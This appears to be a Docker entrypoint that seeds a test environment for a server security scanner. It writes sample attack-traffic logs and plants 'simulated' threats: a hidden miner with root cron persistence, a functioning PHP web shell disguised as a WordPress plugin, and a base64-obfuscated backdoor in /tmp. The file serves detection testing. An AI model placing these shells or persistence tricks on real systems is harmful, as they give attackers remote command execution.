#!/bin/bash
# =============================================================================
# Obsidian Test Environment — Entrypoint
# Sets up a realistic server environment for testing all Obsidian modules
# =============================================================================

set -e

echo ""
echo "=============================================="
echo "  Obsidian Security Suite — Test Environment"
echo "=============================================="
echo ""

# Start Apache (for access log generation)
echo "[Setup] Starting Apache..."
service apache2 start 2>/dev/null || true

# Start cron (for cron job testing)
service cron start 2>/dev/null || true

# Generate some fake access log entries (good traffic + bots)
echo "[Setup] Generating sample access logs..."
ACCESS_LOG="/var/log/apache2/access.log"

# Normal traffic
for i in $(seq 1 20); do
    echo "192.168.1.${i} - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"GET /index.php HTTP/1.1\" 200 5432 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"" >> "${ACCESS_LOG}"
done

# Bad bot traffic (Bytespider — from the real incident)
for i in $(seq 1 50); do
    echo "220.243.135.${i} - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"GET /wp-content/plugins/akismet/akismet.php HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0 (compatible; Bytespider)\"" >> "${ACCESS_LOG}"
done

# SEO crawler spam
for i in $(seq 1 30); do
    echo "54.36.148.${i} - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"GET / HTTP/1.1\" 200 8765 \"-\" \"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)\"" >> "${ACCESS_LOG}"
done

# Vulnerability scanner
for i in $(seq 1 15); do
    echo "185.220.101.42 - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"GET /.env HTTP/1.1\" 404 543 \"-\" \"Mozilla/5.0 (compatible; Nikto)\"" >> "${ACCESS_LOG}"
    echo "185.220.101.42 - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"GET /wp-config.php.bak HTTP/1.1\" 404 543 \"-\" \"sqlmap/1.7\"" >> "${ACCESS_LOG}"
    echo "185.220.101.42 - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"POST /xmlrpc.php HTTP/1.1\" 200 432 \"-\" \"python-requests/2.28.0\"" >> "${ACCESS_LOG}"
done

# Rate abuser (300+ requests from one IP)
for i in $(seq 1 350); do
    echo "45.33.32.156 - - [$(date '+%d/%b/%Y:%H:%M:%S %z')] \"GET /wp-login.php HTTP/1.1\" 200 4321 \"-\" \"Mozilla/5.0 (Go-http-client/1.1)\"" >> "${ACCESS_LOG}"
done

echo "[Setup] Access log generated with ~465 entries"

# Create simulated malware (SAFE — just dummy files for testing)
echo "[Setup] Creating simulated threats for malware scanner..."

# Simulated cryptominer binary (just a dummy file)
echo '#!/bin/bash\n# SIMULATED CRYPTOMINER FOR TESTING\nwhile true; do echo mining; sleep 3600; done' > /home/mybagonline/.config/.cache/fontconfig/lib-update
chmod +x /home/mybagonline/.config/.cache/fontconfig/lib-update

# Simulated malicious cron job
echo "*/120 * * * * /home/mybagonline/.config/.cache/fontconfig/lib-update >/dev/null 2>&1" | crontab -u root - 2>/dev/null || \
    echo "*/120 * * * * /home/mybagonline/.config/.cache/fontconfig/lib-update >/dev/null 2>&1" > /var/spool/cron/crontabs/test_cron 2>/dev/null || true

# Simulated PHP web shell
cat > /var/www/html/wp-content/plugins/cache-helper.php << 'SHELL'
<?php
// This is a SIMULATED web shell for testing Obsidian detection
eval(base64_decode($_POST['cmd']));
system($_GET['exec']);
?>
SHELL

# Simulated backdoor in hidden location
echo '<?php $a=base64_decode("c3lzdGVtKCRfR0VUWydjJ10pOw=="); eval($a); ?>' > /tmp/.hidden_backdoor.php

# World-writable PHP file (permission issue)
chmod 777 /var/www/html/wp-content/themes/flavor/functions.php

# Generate file integrity baseline
echo "[Setup] Generating file integrity baseline..."
obsidian scan baseline /var/www/html --preset wordpress 2>/dev/null || echo "  (baseline generation skipped — will work with obsidian command)"

echo ""
echo "=============================================="
echo "  Test environment ready!"
echo "=============================================="
echo ""
echo "  Try these commands:"
echo ""
echo "  obsidian status                    # Overall status"
echo "  obsidian health check              # Full health check"
echo "  obsidian malware scan /home        # Find the cryptominer!"
echo "  obsidian malware processes          # Scan running processes"
echo "  obsidian malware crons              # Find malicious cron jobs"
echo "  obsidian bots analyze               # Detect bad bots"
echo "  obsidian bots scan-ua               # Find Bytespider & friends"
echo "  obsidian bots scanners              # Find Nikto/sqlmap"
echo "  obsidian scan full                  # Check file integrity"
echo "  obsidian ban 45.33.32.156 --reason 'Rate abuse'"
echo "  obsidian ban list                   # View bans"
echo "  obsidian whitelist add 192.168.1.0/24 --reason 'LAN'"
echo ""

exec "$@"
